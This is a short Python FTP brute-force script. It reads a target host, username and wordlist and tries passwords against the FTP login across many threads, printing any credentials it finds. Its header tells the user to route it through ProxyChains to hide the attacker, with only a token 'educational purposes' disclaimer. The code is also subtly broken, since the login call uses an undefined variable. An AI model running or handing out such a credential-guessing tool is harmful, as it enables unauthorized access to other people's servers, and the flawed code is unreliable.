'''

Author: GiddySpurz
Date:21/3/2020
Name:FTPBruteforce
Use ProxyChains while executing this Script


'''
########################
#This script is for Educational Purpose Only.
#I will not be Liable for Wrong Use of this
#Nice Time hacking Pal :-)
########################


#Code Starts Here
import ftplib
from threading import Thread
import queue
from colorama import Fore, init #for fancy colors,nothing else
import sys
import time


print("FTPBrute Script")
print("Written By GiddySpurz")
print("For Educational Purposes Only.")


q = queue.Queue()
print("Input Host: ")
host = input()
print("Input Username: ")
username = input()
print("Enter The Port: (Default FTP Port 21)")
port = int(input())
print("n_threads: (Number of Threads,Use 10)")
n_threads = int(input())

def connect_ftp():
	global q
	while True:
		password = q.get()
		server = ftplib.FTP()
		print("[!]Trying", password)
		try:
			server.connect(host, int(port), timeout=100000)
			server.login(user, password)
		except ftplib.error_perm:
			pass
		except Exception as e:
			print(e)
		else:
			print(f"{Fore.GREEN}[+]Found credentials: ")
			print(f"\tHost: {host}")
			print(f"\tUser: {user}")
			print(f"\tPassword: {password}{Fore.RESET}")
			with q.mutex:
				q.queue.clear()
				q.all_tasks_done.notify_all()
				q.unfinished_tasks = 0
		finally:
			q.task_done()


passwords = open("wordlist.txt").read().split("\n")
print("[+] Passwords to try:" ,len(passwords))
for password in passwords:
	q.put(password)
for t in range(n_threads):
	thread = Thread(target=connect_ftp)
	thread.daemon = True
	thread.start()
q.join()
